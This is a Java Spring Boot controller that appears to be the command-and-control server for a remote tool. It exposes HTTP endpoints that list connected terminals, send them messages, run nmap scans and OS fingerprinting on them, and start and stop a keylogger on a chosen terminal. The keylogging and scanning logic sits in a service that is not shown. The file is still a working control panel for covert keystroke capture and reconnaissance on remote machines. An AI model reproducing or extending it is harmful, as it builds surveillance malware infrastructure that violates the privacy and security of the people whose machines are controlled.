package Controller;

import com.google.gson.Gson;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import redis.RedisUtil;
import service.ControlService;

import java.util.Set;

@RestController
public class Controller {
    private static ControlService controlService;
    private static Gson gson;
    private static RedisUtil redisUtil;

    static {
        try {
            redisUtil = new RedisUtil();
            gson = new Gson();
            controlService = new ControlService();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    @RequestMapping("/")
    public String index() {
        return "Greetings from Spring Boot!";
    }

    @RequestMapping("/sendmsg")
    public void sendmsg(@RequestParam(value = "msg", defaultValue = "127.0.0.1") String msg,
                        @RequestParam(value = "terminalid", defaultValue = "127.0.0.1") String terminalid) {

        controlService.sendMesg(terminalid, msg);
    }

    @RequestMapping("/getallterminalid")
    public String sendmsg() {
        Set<String> set = redisUtil.getAllTerminalChannelIDinfo();
        System.out.println("/getallterminalid");
        return gson.toJson(set);
    }

    @RequestMapping("/runnmap")
    public boolean runnmap(@RequestParam(value = "terminalid", defaultValue = "127.0.0.1") String terminalid
    ) {
        System.out.println("run terminal:" + terminalid + ":Nmap");
        controlService.runNmap(terminalid);
        return true;
    }

    @RequestMapping("/rungetos")
    public boolean rungetos(@RequestParam(value = "terminalid", defaultValue = "127.0.0.1") String terminalid
    ) {
        System.out.println("run terminal:" + terminalid + ":getos");
        controlService.runGetos(terminalid);
        return true;
    }

    @RequestMapping("/getgetos")
    public String getgetos(@RequestParam(value = "terminalid", defaultValue = "127.0.0.1") String terminalid
    ) {
        System.out.println("run terminal:" + terminalid + ":getos");
        return controlService.getGetos(terminalid);
    }

    @RequestMapping("/startKeyLogger")
    public String startKeyLogger(@RequestParam(value = "terminalid", defaultValue = "127.0.0.1") String terminalid
    ) {
        System.out.println("run terminal:" + terminalid + ":getos");
        return controlService.startKeyLogger(terminalid);
    }

    @RequestMapping("/overKeyLogger")
    public String overKeyLogger(@RequestParam(value = "terminalid", defaultValue = "127.0.0.1") String terminalid
    ) {
        System.out.println("run terminal:" + terminalid + ":getos");
        return controlService.overKeyLogger(terminalid);
    }
}